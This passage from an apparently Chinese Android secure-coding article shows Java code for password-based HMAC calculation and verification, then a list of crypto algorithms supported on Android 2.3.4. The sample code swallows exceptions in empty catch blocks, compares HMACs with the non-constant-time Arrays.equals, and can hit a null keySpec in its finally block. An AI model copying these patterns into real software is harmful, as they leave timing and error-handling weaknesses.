            SecretKey secretKey = generateKey(password, mSalt);
            mac.init(secretKey);
            hmac = mac.doFinal(plain);
        } catch (NoSuchAlgorithmException e) {
        } catch (InvalidKeyException e) {
        } finally {
        }
        return hmac;
    }

    public final boolean verify(final byte[] hmac, final byte[] plain,
            final char[] password) {
        byte[] hmacForPlain = calculate(plain, password);
        if (Arrays.equals(hmac, hmacForPlain)) {
            return true;
        }
        return false;
    }

    private static final SecretKey generateKey(final char[] password,
            final byte[] salt) {
        SecretKey secretKey = null;
        PBEKeySpec keySpec = null;
        try {
            // *** POINT 2 *** 使用健壮的加密方法,包括算法/块加密模式/填充模式
            //创建类实例生成key
            // In this example, we use a KeyFactory that uses SHA1 to generate AES-CBC 128-bit keys.(PBEWITHHMACSHA1)
            SecretKeyFactory secretKeyFactory = SecretKeyFactory
                    .getInstance(KEY_GENERATOR_MODE);
            // *** POINT 3 *** 用password生成key的时候记得加盐 
            // *** POINT 4 *** 用password生成key的时候, 指定合适的hash迭代次数 
            // *** POINT 5 *** 使用足够长度的key以保证MAC强度. 
            keySpec = new PBEKeySpec(password, salt, KEY_GEN_ITERATION_COUNT,
                    KEY_LENGTH_BITS);
            // 清空 password
            Arrays.fill(password, '?');
            // 生成 key
            secretKey = secretKeyFactory.generateSecret(keySpec);
        } catch (NoSuchAlgorithmException e) {
        } catch (InvalidKeySpecException e) {
        } finally {
            keySpec.clearPassword();
        }
        return secretKey;
    }
}

```

### 兼容性问题

* * *

android就是那么让人操心,应用的易用性肯定要放在安全性前面.服务端的环境可以控制,但是客户端的环境就没有办法了.无法保证每个用户都环境都是一样的.

```
java.security.NoSuchAlgorithmException....

```

所以必须得选择一个绝大多数设备都能兼容的算法.下面是 android2.3.4支持的算法.

下面的代码可以查看当前 provider 支持的算法.

```
Provider[] providers = Security.getProviders();
for (Provider provider : providers) {
    Log.i("CRYPTO","provider: "+provider.getName());
    Set<Provider.Service> services = provider.getServices();
    for (Provider.Service service : services) {
        Log.i("CRYPTO","  algorithm: "+service.getAlgorithm());
    }
}

```

android 2.3.4

```
provider: AndroidOpenSSL
 algorithm: SHA-384
 algorithm: SHA-1
 algorithm: SSLv3
 algorithm: MD5
 algorithm: SSL
 algorithm: SHA-256
 algorithm: TLS
 algorithm: SHA-512
 algorithm: TLSv1
 algorithm: Default
provider: DRLCertFactory
 algorithm: X509
provider: BC
 algorithm: PKCS12
 algorithm: DESEDE
 algorithm: DH
 algorithm: RC4
 algorithm: PBEWITHSHAAND128BITAES-CBC-BC
 algorithm: DESEDE
 algorithm: Collection
 algorithm: SHA-1
 algorithm: PBEWITHSHA256AND256BITAES-CBC-BC
 algorithm: PBEWITHSHAAND192BITAES-CBC-BC
 algorithm: DESEDEWRAP
 algorithm: PBEWITHMD5AND128BITAES-CBC-OPENSSL
 algorithm: PBEWITHMD5AND256BITAES-CBC-OPENSSL
 algorithm: AES
 algorithm: HMACSHA256
 algorithm: OAEP
 algorithm: HMACSHA256
 algorithm: HMACSHA384
 algorithm: DSA
 algorithm: PBEWITHMD5AND192BITAES-CBC-OPENSSL
 algorithm: DES
 algorithm: PBEWITHMD5ANDDES
 algorithm: SHA1withDSA
 algorithm: PBEWITHMD5ANDDES
 algorithm: BouncyCastle
 algorithm: PKIX
 algorithm: PKCS12PBE
 algorithm: DSA
 algorithm: RSA
 algorithm: PBEWITHSHA1ANDDES
 algorithm: DESEDE
 algorithm: PBEWITHSHAAND128BITRC2-CBC
 algorithm: PBEWITHSHAAND128BITRC2-CBC
 algorithm: PBEWITHSHAAND256BITAES-CBC-BC
 algorithm: PBEWITHSHAAND128BITRC4
 algorithm: DH
 algorithm: PBEWITHSHA256AND192BITAES-CBC-BC
 algorithm: PBEWITHSHAAND128BITAES-CBC-BC
 algorithm: PBEWITHSHAAND40BITRC2-CBC
 algorithm: HMACSHA384
 algorithm: AESWRAP
 algorithm: PBEWITHSHAAND192BITAES-CBC-BC
 algorithm: SHA256WithRSAEncryption
 algorithm: DES
 algorithm: HMACSHA512
 algorithm: HMACSHA1
 algorithm: DH
 algorithm: PBEWITHSHA256AND128BITAES-CBC-BC
 algorithm: PKIX
 algorithm: PBEWITHMD5ANDRC2
 algorithm: SHA-256
 algorithm: PBEWITHSHA1ANDDES
 algorithm: HMACSHA512
 algorithm: SHA384WithRSAEncryption
 algorithm: DES
 algorithm: BLOWFISH
 algorithm: PBEWITHMD5AND128BITAES-CBC-OPENSSL
 algorithm: PBEWITHSHAAND3-KEYTRIPLEDES-CBC
 algorithm: PBEWITHSHAAND256BITAES-CBC-BC
 algorithm: DSA
 algorithm: PBEWITHSHAAND40BITRC2-CBC
 algorithm: BLOWFISH
 algorithm: PBEWITHSHAAND40BITRC4
 algorithm: PBKDF2WithHmacSHA1
 algorithm: PBEWITHSHAAND40BITRC4
 algorithm: HMACSHA1
 algorithm: AES
 algorithm: PBEWITHSHA256AND192BITAES-CBC-BC
 algorithm: PBEWITHSHAAND2-KEYTRIPLEDES-CBC
 algorithm: PBEWITHHMACSHA
 algorithm: DH
 algorithm: BKS
 algorithm: NONEWITHDSA
 algorithm: DES
 algorithm: PBEWITHMD5ANDRC2
 algorithm: DSA
 algorithm: PBEWITHSHAANDTWOFISH-CBC
 algorithm: SHA512WithRSAEncryption
 algorithm: HMACMD5
 algorithm: PBEWITHSHAAND3-KEYTRIPLEDES-CBC
 algorithm: PBEWITHSHA1ANDRC2
 algorithm: ARC4
 algorithm: PBEWITHHMACSHA1
 algorithm: AES
 algorithm: PBEWITHHMACSHA1
 algorithm: MD5
 algorithm: RSA
 algorithm: PBEWITHSHAANDTWOFISH-CBC
 algorithm: PBEWITHSHA1ANDRC2
 algorithm: PBEWITHSHAAND2-KEYTRIPLEDES-CBC
 algorithm: PBEWITHSHAAND128BITRC4
 algorithm: SHA-384
 algorithm: RSA
 algorithm: DESEDE
 algorithm: SHA-512
 algorithm: X.509
 algorithm: PBEWITHMD5AND192BITAES-CBC-OPENSSL
 algorithm: MD5WithRSAEncryption
 algorithm: PBEWITHMD5AND256BITAES-CBC-OPENSSL
 algorithm: PBEWITHSHA256AND256BITAES-CBC-BC
 algorithm: BLOWFISH
 algorithm: DH
 algorithm: SHA1WithRSAEncryption
 algorithm: HMACMD5
 algorithm: PBEWITHSHA256AND128BITAES-CBC-BC
provider: Crypto
 algorithm: SHA1withDSA
 algorithm: SHA-1
 algorithm: DSA
 algorithm: SHA1PRNG
provider: HarmonyJSSE
 algorithm: X509
 algorithm: SSLv3
 algorithm: TLS
 algorithm: TLSv1
 algorithm: X509
 algorithm: SSL

```

第三方加密方案,提供 provider

[https://github.com/facebook/conceal](https://github.com/facebook/conceal)

### 参考

* * *

[http://www.jssec.org/dl/android_securecoding_en.pdf](http://www.jssec.org/dl/android_securecoding_en.pdf)

[http://stackoverflow.com/questions/7560974/what-crypto-algorithms-does-android-support](http://stackoverflow.com/questions/7560974/what-crypto-algorithms-does-android-support)